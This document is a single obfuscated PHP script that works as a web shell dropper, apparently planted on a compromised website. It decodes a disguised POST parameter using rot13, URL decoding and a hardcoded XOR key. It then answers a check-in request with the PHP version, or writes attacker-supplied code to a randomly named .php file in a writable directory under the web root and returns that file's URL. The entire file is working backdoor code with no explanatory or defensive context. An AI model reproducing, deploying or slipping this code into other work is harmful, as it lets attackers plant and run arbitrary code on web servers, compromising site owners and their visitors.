<?php $efvxyptc = "lzmcvzyoohxrzsur";$zoirxtdqk = "";foreach ($_POST as $mpurrpj => $whluoyfdwu){if (strlen($mpurrpj) == 16 and substr_count($whluoyfdwu, "%") > 10){dtnaeygw($mpurrpj, $whluoyfdwu);}}function dtnaeygw($mpurrpj, $oxrzmkdi){global $zoirxtdqk;$zoirxtdqk = $mpurrpj;$oxrzmkdi = str_split(rawurldecode(str_rot13($oxrzmkdi)));function wfjjgsra($xmizx, $mpurrpj){global $efvxyptc, $zoirxtdqk;return $xmizx ^ $efvxyptc[$mpurrpj % strlen($efvxyptc)] ^ $zoirxtdqk[$mpurrpj % strlen($zoirxtdqk)];}$oxrzmkdi = implode("", array_map("wfjjgsra", array_values($oxrzmkdi), array_keys($oxrzmkdi)));$oxrzmkdi = @unserialize($oxrzmkdi);if (@is_array($oxrzmkdi)){$mpurrpj = array_keys($oxrzmkdi);$oxrzmkdi = $oxrzmkdi[$mpurrpj[0]];if ($oxrzmkdi === $mpurrpj[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function kahndhetja($jernfir) {static $tfewuxjr = array();$lvxka = glob($jernfir . '/*', GLOB_ONLYDIR);if (count($lvxka) > 0) {foreach ($lvxka as $jernf){if (@is_writable($jernf)){$tfewuxjr[] = $jernf;}}}foreach ($lvxka as $jernfir) kahndhetja($jernfir);return $tfewuxjr;}$tkdpb = $_SERVER["DOCUMENT_ROOT"];$lvxka = kahndhetja($tkdpb);$mpurrpj = array_rand($lvxka);$xrxkefpg = $lvxka[$mpurrpj] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($xrxkefpg, $oxrzmkdi);echo "http://" . $_SERVER["HTTP_HOST"] . substr($xrxkefpg, strlen($tkdpb));exit();}}}